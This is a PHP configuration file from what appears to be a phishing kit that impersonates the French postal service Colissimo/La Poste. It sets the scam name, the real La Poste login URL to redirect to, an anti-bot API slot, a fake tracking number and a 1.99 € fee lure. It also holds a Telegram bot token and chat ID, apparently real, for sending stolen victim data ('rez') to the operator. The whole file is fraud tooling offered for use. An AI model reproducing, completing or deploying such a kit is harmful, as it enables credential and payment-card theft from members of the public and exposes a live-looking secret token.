<?php
/*
██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██║     ███████║██║     █████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝   
Coded By Root_Dr
DM:@Root_Dr
*/
session_start();
error_reporting(0);

define("TESTMODE", false); // true or false
define("ANTIBOTPW_API", ''); // ANTIBOT.PW API

define("FLAG", '🇫🇷');
define("SCAM_NAME", 'COLISSIMO');
define("WEBSITE", 'https://www.laposte.fr/monCompteV3/authorization?callbackURL=necDashboard');

// SCAM LINK
define("PANEL", 'http://www.localhost/colissimo24/');
// TELEGRAM BOT REZ CONFIG
define("TOKEN", '6824139329:AAGjdKUcpSIUKKxJOdpGSh3MSp4hoWuwn7E');
define("CHATID", '-1001613821074');
// MAIL REZ CONFIG
define("BULLET", 'your@email.com');

define("PHONE", false); // true or false
define("CONTROLLER", true); // true or false
define("NOTIF", false); // true or false

define("TRACK", "CA026425617NC");
define("PRICE", "1.99 €"); 